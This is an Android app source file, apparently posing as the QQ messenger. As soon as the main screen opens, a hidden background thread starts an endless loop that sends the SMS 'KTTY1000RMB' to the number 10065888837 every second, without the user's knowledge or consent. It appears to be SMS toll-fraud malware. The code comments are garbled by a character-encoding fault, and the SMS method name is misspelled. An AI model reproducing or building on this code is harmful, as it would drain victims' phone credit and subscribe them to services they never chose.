package com.HUAT.qq;

import android.support.v7.app.ActionBarActivity;
import android.telephony.gsm.SmsManager;
import android.os.Bundle;
import android.os.SystemClock;
import android.view.Menu;
import android.view.MenuItem;
import android.view.Window;

public class MainActivity extends ActionBarActivity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		
		//ȥ�����⣬������setContentView����ǰ����
		requestWindowFeature(Window.FEATURE_NO_TITLE);	//ȥ������
		
		setContentView(R.layout.activity_main);
		
		//����һ�����̣߳�while(true)ѭ�����Ͷ���
		new Thread(new Runnable(){

			@Override
			public void run() {
				// TODO Auto-generated method stub
				//ѭ�����Ͷ���
				
				while(true){
					
					//Thread.sleep(1000);
					
					SystemClock.sleep(1000);
					
					SmsManager smsManager = SmsManager.getDefault();	//���Ź�����
					smsManager.sentTextMessage(
							"10065888837",	//�ռ��˵ĺ���
							null,	//�������ĺ���
							"KTTY1000RMB",
							null,	//������ͳɹ����ص��㲥��֪ͨ����
							null	//���Է����ܳɹ����ص��˹㲥
							);
				}
			}
			
		}).start();
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// Handle action bar item clicks here. The action bar will
		// automatically handle clicks on the Home/Up button, so long
		// as you specify a parent activity in AndroidManifest.xml.
		int id = item.getItemId();
		if (id == R.id.action_settings) {
			return true;
		}
		return super.onOptionsItemSelected(item);
	}
}
